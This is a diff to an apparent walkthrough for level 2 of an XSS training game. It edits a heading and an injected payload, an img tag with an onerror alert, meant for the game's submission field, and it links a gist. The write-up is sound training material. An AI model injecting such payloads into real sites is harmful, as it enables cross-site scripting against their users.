@@ -17,12 +17,13 @@ this level will be solved every time you reload it.
 ```
 https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45
 ```
-**Inject the payload**
+**Inject the payload:**
+
 There are many ways to do this. One approach is use the following command
 and paste on the submission field.
 
 ``
-"><img src=x onerror=javascript:alert(`Xss level 2`)>
+"><img src=x onerror=javascript:alert(`XssLevel2`)>
 ``
 
 ![](/XSS_Game/Level2/Img/Xss_Level2.png)
